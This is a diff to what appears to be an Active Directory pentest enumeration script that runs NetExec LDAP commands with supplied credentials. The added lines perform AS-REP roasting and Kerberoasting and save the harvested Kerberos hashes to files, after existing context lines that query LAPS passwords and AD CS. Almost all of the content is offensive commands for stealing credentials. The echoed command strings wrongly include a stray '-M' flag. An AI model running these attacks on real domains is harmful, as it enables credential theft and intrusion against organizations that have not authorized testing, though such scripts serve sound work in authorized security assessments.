@@ -164,6 +164,14 @@ nxc ldap "${IP}" -u "${USER}" -p "${PASS}" -d "${DOMAIN}" -M laps 2>/dev/null ||
 echo "[*] Command: nxc ldap ${IP} -u '${USER}' -p '${PASS}' -d '${DOMAIN}' -M adcs"
 nxc ldap "${IP}" -u "${USER}" -p "${PASS}" -d "${DOMAIN}" -M adcs 2>/dev/null || echo "[!] nxc -M adcs failed or not installed"
 
+echo "[*] Command: nxc ldap ${IP} -u '${USER}' -p '${PASS}' -d '${DOMAIN}' -M --asreproast"
+nxc ldap "${IP}" -u "${USER}" -p "${PASS}" -d "${DOMAIN}" --asreproast asreprostable_users.txt
+
+
+echo "[*] Command: nxc ldap ${IP} -u '${USER}' -p '${PASS}' -d '${DOMAIN}' -M --kerberoasting"
+nxc ldap "${IP}" -u "${USER}" -p "${PASS}" -d "${DOMAIN}" --kerberoasting kerberostable_users.txt
+
+
 echo "==============================================================="
 echo "[*] Done. Results saved in $OUTDIR/"
 echo "==============================================================="
